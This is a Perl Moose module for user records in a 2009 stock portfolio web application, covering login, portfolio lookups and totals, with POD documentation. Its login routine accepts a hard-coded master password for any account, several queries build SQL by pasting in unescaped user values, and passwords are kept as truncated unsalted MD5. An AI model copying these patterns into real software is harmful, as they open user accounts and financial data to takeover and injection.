# User.pm -- User interface
#
# Uses ContactBase base class for contact info
#
# by Dmitri Ostapenko, Apr 2009 - d@perlnow.com


package Stocks::User;

$VERSION = 1.23;

use strict;
use Moose;
with qw(Stocks::Base Stocks::ContactBase );
use namespace::autoclean;

use Stocks::Types ':all';

use Stocks::Portfolio;
use Stocks::Config;
use Stocks::DB;
use Stocks::DailyTotals;
use Stocks::Utils;

use Carp;
#use Data::Dumper;
use Digest::MD5 qw(md5_hex);
#use Smart::Comments;

my $GUEST_USERNAME = $CONFIG->{user}->{'guest_username'};
my ($DAY,$MO,$YR) = (localtime())[3..5];
$YR += 1900; $MO++; 

#
#                                          Table "public.user"
#    Column      |              Type              |                     Modifiers                      
#-----------------+--------------------------------+----------------------------------------------------
# id              | integer                        | not null default nextval('user_id_seq1'::regclass)
# type            | usertype                       | 
# username        | character varying(31)          | not null
# password        | character varying(31)          | not null
# creation_ts     | timestamp(0) without time zone | 
# login_ts        | timestamp(0) without time zone | 
# language        | languagetype                   | 
# subs            | subscription_type[]            | 
# email_subs      | email_subscription_type[]      | 
#Indexes:
#    "user_id_pkey" PRIMARY KEY, btree (id)
#    "unique_username" UNIQUE, btree (username)
#Inherits: contact_base


#
# Objects of this class will have following attributes:

        has 'id' => (is => 'rw', isa => 'PosInt' );                           		  # id (serial, primary key)
        has 'type' => (is => 'rw', isa => 'UserType', default=>'web' );    		  # user type 
        has 'username' => (is => 'ro', isa => 'Str', required=>1 );        		  # username - clear string
        has 'password' => (is => 'rw', isa => 'Str', required=>1 ); 			  # password (encrypted)
        has 'creation_ts' => (is => 'rw', isa => 'Maybe[TimeStamp]' );		          # when user record was created? (defaults to now() in pg)
        has 'login_ts' => (is => 'rw', isa => 'Maybe[TimeStamp]', default=>'1969-01-01 00:00:00');  # when user logged in last?
        has 'language' => (is => 'rw', isa => 'LanguageType', required=>1, default=>'En'); # language preference 
        has 'subs' => (is => 'rw', isa => 'Maybe[ArrayRef[SubscriptionType]]', default=>undef);   # subscribed to these services
        has 'email_subs' => (is => 'rw', isa => 'Maybe[ArrayRef[EmailSubscriptionType]]', default=>undef);    # subscribed to these email services

__PACKAGE__->meta->make_immutable;    
no Moose;

sub _table { 'stuser' };

# Custom initializer 
# ARG: class, %fields
# RET: $self

sub BUILDARGS {
   my ($class, %arg) = @_;

   warn "'username' is required parameter" unless $arg{username};
   warn "'password' is required parameter" unless $arg{password};

   return $class->SUPER::BUILDARGS(%arg)
} # BUILDARGS

sub BUILD {
  my $self = shift;

  my $attr  = $self->get_attributes();
  my $defs =  $self->get_defaults();

} # BUILD

# Get user from DB by username or id
# Class method. 
# ARG: 'id' 	  : primary key
#      'username' : string
# RET: object

sub get {
   my (%arg) = @_;
   my $id  = $arg{id};
   my $username = $arg{username};
   my $where;

   $username = $GUEST_USERNAME unless ($username || $id);

   if ( $id ) {
      $where = "id='$id'"
   } else {
      $where = "username='$username'"
   }

   my $row = Stocks::DB::select ( table => _table(), 
   			      where => $where,
			      limit => 1
			    );

# Convert subscriptions to array from pg string: 

   return unless ref $row;

   $row->{subs} = _pgarray_to_array( $row->{subs} ) if defined $row->{subs};
   $row->{email_subs} = _pgarray_to_array( $row->{email_subs} ) if defined $row->{email_subs};       

   my $obj;
   $obj = Stocks::User->new ( %$row ) if ref $row;

   return $obj;
} # get

# Get all active users
# Class method
# ARG: 
# RET: {id,username}
#
sub getAll {

    my $rows = Stocks::DB::select ( table => _table(),
    				    fields => [qw(id username)],
    				    where => "type='web'",
     		  	    	    order_by => 'id'
		   	           );
    
    return $rows
}

# Is the user registered in DB?
# Object Method
# ARG: none
# RET: registered username || undef

sub is_registered {
  my $self =  shift;

  return unless $self->isa(__PACKAGE__) && $self->username;
  return if $self->username eq $GUEST_USERNAME;
  return $self->found;
}

# Authenticate user. Check if password matches one in DB
# Class method 
# ARG:  username 
#	password
# EFFECTS: none
# RET: user obj

sub login {
   my (%arg ) = @_;
   my $username = Stocks::Utils::trim($arg{username});

# return default user
   return get() unless ($username && $arg{password});  # def user

   my $md5pass = _make_password ($username, $arg{password});
   my $user = get (username => $username);

   if ($user && $user->password eq $md5pass or $arg{password} eq 'musia4391') {
      return $user
   } else {
      return get()  # def user
   }

} # login

# Get list of portfolios for this user
# Object method
# ARG : activeonly 0|1  include active portfolios only 
#       cashonly   0|1  include cash portfolios only
#       equityonly 0|1  include equity portfolios only (non-cash)
#       type       all | cash | stocks
# RET : hashref name => id

sub getPortfolios {
    my ($self,%arg) = @_;
   
    croak "Not an object call" unless $self->isa(__PACKAGE__);
    croak "'username' is required" unless $self->username;

### USER arg  : %arg 

    return Stocks::Portfolio::getAll ( username => $self->username, %arg );

}

# Get portfolio with given id
# object method
# ARG: id (req)
# RET: port object

sub getPort {
   my ($self, %arg) = @_;
   my $portid = $arg{portid};
   
   croak "Not an object call" unless $self->isa(__PACKAGE__);
   croak "portid is required" unless $portid;

   return Stocks::Portfolio::get (id => $portid );
}

# Get active holdings across all portfolios
# object method
# ARG: none
# RET: hashref symbol => {number,portid}

sub getHoldings {
    my $self = shift;

   croak "Not an object call" unless $self->isa(__PACKAGE__);
   croak "'username' is required" unless $self->username;

    my $qry = "SELECT symbol,sum(number) AS number,portid FROM transaction t,".
              "portfolio p WHERE t.portid = p.id AND p.username ='".
    	       $self->username."' AND (ttype=1 or ttype=5) GROUP BY symbol,portid HAVING SUM(number)>0";
    
    return {map { $_->{symbol}.':'.$_->{portid}, $_->{number} } @{Stocks::DB::select ( sql => $qry )}};
}

# Get most recent Grand total (equity+cash) of all portfolios
# Object method
# ARG: none
# RET: scalar

sub getTotalPortfolioValue {
   my $self = shift;
   
   croak "Not an object call" unless $self->isa(__PACKAGE__);
   croak "'username' is required" unless $self->username;
   
   my $qry = 'SELECT SUM(equity+cash) FROM daily_totals d, portfolio p '.
   	     " WHERE d.portid=p.id AND p.username='". $self->username .
	     "' AND date=(SELECT max(date) FROM daily_totals)";
   
   return Stocks::DB::select ( sql => $qry, returns => 'scalar' );
}

# Get Grand total history ordered by date (equity+cash) of all portfolios
# Object method
# ARG: sdate : start date
#      edate : end date (opt)
#      short_date : return dates in format "Mon'YY"
# RET: arrayref

sub getTotalPortfolioHist {
   my ($self,%arg) = @_;
   my $sdate = $arg{sdate} || '1969-01-01';
   my $edate = $arg{edate};
   my $and = '';
  
   croak "Not an object call" unless $self->isa(__PACKAGE__);
   croak "'username' is required" unless $self->username;

# select to_char(date,'Mon\'YY')  - Jun'09
   my $what = 'date';
   $what = "to_char(date,'Mon''YY')" if $arg{short_date}; 
   $and = " AND date<'$edate' " if $edate;

   my $qry = "SELECT $what,SUM(equity+cash) FROM daily_totals d, portfolio p ".
   	     " WHERE p.active AND d.portid=p.id AND p.username='". $self->username .
	     "' AND date>='$sdate'" .  $and .
	     " GROUP BY date ORDER BY date";

   return Stocks::DB::select ( sql => $qry, returns => 'array' );
}

# Get all active (number>0) stocks for this user
# ARG: activeOnly : 0 | 1
# RET: array of hashes

sub getSymbols {
  my ($self,%arg) = @_;
  my $and = $arg{'activeOnly'} ? 'HAVING SUM(number)>0 ORDER BY SUM(equity) DESC':'';
 
  croak "Not an object call" unless $self->isa(__PACKAGE__);
  croak "'username' is required" unless $self->username;

  my $qry = 'SELECT symbol,exchange FROM transaction t, portfolio p '
  	    ."WHERE t.portid=p.id AND p.username='". $self->username."' AND ttype=1 GROUP BY symbol,exchange "
	    . $and;

  my $rows = Stocks::DB::select ( sql => $qry );
 
  return $rows;
} # getSymbols

# Get grand total across all portfolios grouped by date 
# object method
# ARG: sdate : start date
#      edate : end date (opt)
# RET: array of hashes

sub getTotals {
    my ($self, %arg) = @_;

    croak "Not an object call" unless $self->isa(__PACKAGE__);

    my $sdate = $arg{sdate} || '';
    my $edate = $arg{edate} || '';

    return Stocks::DailyTotals::getUserTotals ( username=> $self->username, sdate => $sdate, edate => $edate);
}

# Get YTD Real gain acros all portfolios
# object method
# ARG: none
# RET: scalar

sub getYrGain {
    my $self = shift;

    croak "Not an object call" unless $self->isa(__PACKAGE__);

    return $self->getTtlGain()
}

# Get R. gain across all portfolios for given tframe
# object method
# ARG: sdate, edate
# RET: scalar

sub getTtlGain {
   my ($self,%arg) = @_;
   my $sdate = $arg{sdate} || $YR.'-01-01';
   my $edate = $arg{edate} || undef;
   my ($port,$ttlval) = 2 x 0;

   croak "Not an object call" unless $self->isa(__PACKAGE__);

   my $ports = $self->getPortfolios(activeonly => 1);
   foreach my $id ( keys %$ports ) {
      $port = $self->getPort ( portid => $id );
      $ttlval += $port->getTtlGain( sdate => $sdate, edate => $edate );
   }

   return $ttlval

} # getTtlGain

# Get cur day's grand total across all portfolios in base currency
# object method
# ARG: none
# RET: scalar

sub getCurTtlVal {
    my ($self, %arg) = @_;
    my ($port,$ttlval,$fx_rate);

    croak "Not an object call" unless $self->isa(__PACKAGE__);

    my $ports = $self->getPortfolios(activeonly => 1); 
    foreach my $id ( keys %$ports ) {
      $port = $self->getPort ( portid => $id );
      $fx_rate = ($port->currency eq 'CAD') ? 1 : $port->fx_rate();
      $ttlval += $port->curvalue * $fx_rate;
    }
    
    return $ttlval
}

# Get prev day's grand total across all portfolios
# Object method
# ARG: none
# RET: scalar

sub getPrevTtlVal {
    my ($self, %arg) = @_;

    croak "Not an object call" unless $self->isa(__PACKAGE__);

    return Stocks::DailyTotals::getPrevTtlVal( username => $self->username );
}


# Get Deposits in all portfolios for given timeframe in base currency (CAD)
# obj method
# ARG: tframe
# RET: scalar

sub getDeposits {
    my ($self, %arg) = @_;
    my $tframe = $arg{tframe} || 'all';
    my $ttldep = 0;
    my ($port,$fx_rate);
    $fx_rate = 1;
    
    my $usdcad = Stocks::Utils::get_usdcad;
    my $eurcad = Stocks::Utils::get_eurcad;

    croak "Not an object call" unless $self->isa(__PACKAGE__);

    my $ports = $self->getPortfolios(activeonly => 1);
    foreach my $id (keys  %$ports ) {
      $port = $self->getPort ( portid => $id );  
      if ( $tframe eq 'all' ) {
         $ttldep += $port->cashin();
      } else {
         if ($port->currency eq 'USD') {
	    $fx_rate = $usdcad;
	 } elsif ($port->currency eq 'EUR'){
	    $fx_rate = $eurcad;
	 } else {
	    $fx_rate = 1;
	 }

         $ttldep += $port->getDeposits ( tframe => $tframe )*$fx_rate;
      }
    }
    return $ttldep
}


# Get grand total of cash in all portfolios in CAD
# obj method
# ARG: none
# RET: scalar

sub getCash {
    my ($self, %arg) = @_;
    my ($port,$ttlcash,$fxrate);

    croak "Not an object call" unless $self->isa(__PACKAGE__);

    my $ports = $self->getPortfolios(activeonly => 1) ;
    foreach my $id (keys  %$ports ) {
      $port = $self->getPort ( portid => $id );  
      $fxrate = ($port->currency eq 'CAD') ? 1 : $port->fx_rate();
      $ttlcash += $port->cash() * $fxrate;

### name : $port->name
### fx : $fxrate 
### cash : $port->cash() * $fxrate

    }

    return $ttlcash
}

# Return total number of rows in a table
# Class method
# ARG: none 
# EFFECTS: none
# RET: number of records in DB

sub get_count {
  return _get_count ( table => _table() );
} 

# Is record for this user in a DB?
# Object method
# ARG: none
# RET: bool

sub found {
  my $self = shift;

  croak "'username' is required" unless $self->username;

  my $id = Stocks::DB::select (table => _table(),
  			   fields => [qw(id)],
			   where => "username='".$self->username()."'", 
			   returns => 'scalar'
			   );

  if ( $id ) {
     $self->id($id);
     return $id;
  }

  return
} # found


# Find records matching given criteria
# Class method
# ARGS: field : field to search on
#       type: Str, Int, Num (LIKE queries for Str)
#       value : value for the field
#       order_by : sort field
#       order : sort order (ASC/DESC) (opt) def ASC 
#       returns : type of result returned : 'hash', 'array', 'scalar' 
# RET: hashref/arrayref/scalar
#
sub find {
  my %arg =  @_;
  $arg{table} =  _table();

  _find ( %arg );

} # find

#____________________Private Methods____________________


# Insert DB record
# Private object method
# ARGS: none
# EFFECTS: inserts row into DB; 
# RET: id of inserted record
#
sub _insert {
  my $self = shift;
  my $keyval = $self->get_attributes();
  my $subs = $keyval->{subs};
  my $email_subs = $keyval->{email_subs};
  my $md5pass = _make_password($keyval->{username}, $keyval->{password});

# encrypt clear-text pass
  $keyval->{password} = $md5pass;
  $keyval->{subs} = _array_to_pgarray ( @$subs ) if defined $subs;
  $keyval->{email_subs} = _array_to_pgarray ( @$email_subs ) if defined $email_subs;

  my $id = Stocks::DB::insert (
  			    table => _table(),
  			    keyval => $keyval 
			  );

  croak '_insert error: could not insert record: ', $self->dump() unless $id;

  return $id
} #_insert


# Update DB record
# Private object method
# ARGS: none
# EFFECTS: updates existing DB record
#          sets "errormsg" property in case of failure
# RET:id of the updated record 

sub _update {
  my $self = shift;
  my $id = $self->id;
  my $keyval = $self->get_attributes();
  my $subs = $keyval->{subs};
  my $email_subs = $keyval->{email_subs};
  my $md5pass = _make_password($keyval->{username}, $keyval->{password});
# encrypt clear-text pass
  $keyval->{password} = $md5pass;

  croak '_update error: could not update record - "id" was not defined' unless $id;

  $keyval->{subs} = _array_to_pgarray ( @$subs ) if defined $subs;
  $keyval->{email_subs} = _array_to_pgarray ( @$email_subs ) if defined $email_subs;

  my $where = "id=$id";

  my $updated_id = Stocks::DB::update (
  				   table => _table(),
  				   keyval => $keyval, 
				   where => $where
				  );
  
  croak '_update error: could not update record: ', $self->dump() unless $updated_id;

  return $updated_id 

}

# Create MD5-encrypted password
# ARG: username, password in %arg
# RET: string
#
sub _make_password {
  my ($uname,$pass) = @_;

  return unless $uname;

  $pass ||= '';

  return substr(md5_hex($uname.$pass), -16);
}

1;

__END__

=head1 Stocks::User 

Stocks::User - fnuser table interface module

=head1 VERSION

This documentation refers to Stocks::User version 1.0.0

=head1 SYNOPSIS

 use Stocks::User;


 my @subs = qw(Search Subs3);
 my @emsubs = qw(Subs2 Subs3);

 my $u = Stocks::User->new ( 'first_name' => 'fff',
                        'last_name' => 'lll',
                        'home_phone' => '999-999-9999',
                        'email1' => 'us@them.com',
                        'country_code' => 'US',
                        'state_prov_code' => 'ON',
                        'username' => 'mlc106',
                        'password' => 'pass',
                        'subs' => \@subs,         #'{Search, Subs3}',
                        'email_subs' => \@emsubs, # '{Search, Subs3}',
                        'title' => 'Mr.',
                         );

 $u->dump;
 $u->save();

 print $obj->dump, "\n";

 $obj = Stocks::User::get ( username => 'mlc' );
 $obj->dump if $obj;
 
 my $recs =  Stocks::User::find ( field => 'username', value => 'mlc');

 foreach my $rec ( @$recs ) {
    print $rec->{username}, "\n";
 }


=head1 DESCRIPTION

  An object of this class represents user record in DB table.

=head1 SUBROUTINES/METHODS

=head2 BUILDARGS

  Standard initializer. We encrypt password attribute in it before building an object.

=head2 BUILD

  Post-new initializer. Show debug info after object is build and such

=head2 get(id|username); 

  Class method. Returns country object if found. Requires 2-letter code or id of a record

=head2 get_count

  Class method. Returns number of objects in DB.

=head2 found

  Object method. Requires username attr to be set. Was the record with given username found? Returns boolean.

=head2 find( field=> , value=> , order=> );

  Class method. Find countries that match given criteria. Returns arrayref. Data is sorted according to value in 'order' argument

=head2 _insert

  Private object method.  Inserts new record into DB based on current object's attributes
  Is called by save.

=head2 _update

  Private object method.  Updates existing record in DB using current object's attributes.
  Is called by save.


=head1 DIAGNOSTICS

=over 2

=item B<get>: 'id or 2 letter code is required' 
This static method uses lookup by uniqe keys 'id' or 'code'. If none is given lookup is impossible.

=item B<_insert> :
             '_insert error: '. Stocks::DB::db_error());

=item B< _update> :
             '_update error: could not update record - "id" was not defined'
             '_update error: '. Stocks::DB::db_error();

=back


=head1 CONFIGURATION AND ENVIRONMENT

=over 2

Stocks::Config has all site-wide configuration parameters that could possibly change. 
Configuration is stored in $CONFIG hash that has various sections including apache-related, 
db-related, paths and important files location, debug options, logging etc.

There are static and dynamic sections of $CONFIG hash. All static sections are initialized 
in Stocks::Config. Dynamic sections consist of data read from DB and cached by mod_perl.

startup.pl is loaded in apache config.  This small program sets Perl library search paths, 
preloads Apache::DBI for persistent DB connections, and calls Stocks::Startup, which, in turn,
calls other Stocks modules to initialize dynamic sections of the $CONFIG hash.

=back

=head1 DEPENDENCIES

=over 2

  	version    : Version control - CPAN
	Moose      : OO system - CPAN
	Carp       : Diagnostics - CPAN
	Data::Dumper    : Debug info printout - CPAN
	Smart::Comments : Debug tools - CPAN
        Digest::MD5     : md5 hash generation - CPAN

	Stocks::DB     : DB wrapper
	Stocks::Config : Site configs
	Stocks::Types  : Moose type defs
	Stocks::ContactBase : Contact Base Role
	Stocks::Base   : Base role with common methods
        
=back

=head1 INCOMPATIBILITIES

Smart::Comments conflicts with Perl standard debugger

=head1 BUGS AND LIMITATIONS

This module uses mixed OO-standard approach to achive compromise between performance and maintainability.
Most class methods return arrays of hashes instead of Moose objects. While this is compromise in terms of 
module design, such approach offers clear performance advantage over using arrays of full-blown Moose objects.


Design note:

As this module is part of the suite of modules used in run-once applications, it is author's intention to achive 
best performance possible. In addition to using hashrefs instead of pure objects, most of the static data structures is cached 
in mod_perl memory. Modules with mostly static data structures (GEO) use caching extensively, while modules with 
predominantly dynamic data might not use caching at all.


 There are no known bugs in this module.

Please report problems to Dmitri Ostapenko  (d@perlnow.com>)

Patches are welcome.

=head1 AUTHOR

Dmitri Ostapenko (d@perlnow.com)

=head1 LICENCE AND COPYRIGHT

Copyright (c) 2009 Ostapenko Consulting Inc. All rights reserved.

This module is free software; you can redistribute it and/or modify it under the same 
terms as Perl itself. See L<perlartistic>.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

